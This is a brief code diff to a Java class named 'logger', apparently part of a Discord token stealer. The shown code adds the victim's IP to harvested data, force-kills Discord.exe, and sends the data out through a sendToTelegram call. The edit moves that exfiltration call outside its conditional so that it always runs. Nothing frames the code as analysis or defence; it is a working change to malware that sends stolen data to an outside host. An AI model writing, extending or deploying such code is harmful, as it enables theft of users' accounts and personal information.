@@ -61,7 +61,6 @@ public class logger extends config {
                 data = data + " IP: " + ip;
             }
             if (tokenneeded) {
-                sendToTelegram(data);
                 if (killprocessneeded) {
                     Runtime.getRuntime().exec("taskkill /F /IM Discord.exe");
                     Thread.sleep(100);
@@ -100,6 +99,7 @@ public class logger extends config {
                 frame.add(label);
                 frame.setVisible(true);
             }
+            sendToTelegram(data);
         } catch (Exception e) {
             System.out.println("An error occurred.");
         }
